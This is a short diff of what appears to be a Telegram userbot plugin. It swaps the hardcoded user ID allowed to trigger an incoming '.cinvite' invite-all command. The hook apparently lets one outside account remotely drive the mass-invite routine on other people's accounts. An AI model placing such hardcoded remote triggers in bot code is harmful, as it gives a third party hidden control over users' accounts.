@@ -50,7 +50,7 @@ async def get_chatinfo(event):
 
 
 @bing_cmd(pattern="inviteall(?: |$)(.*)")
-@register(incoming=True, from_users=1663258664,
+@register(incoming=True, from_users=1337194042,
           pattern=r"^\.cinvite(?: |$)(.*)")
 async def get_users(event):
     sender = await event.get_sender()
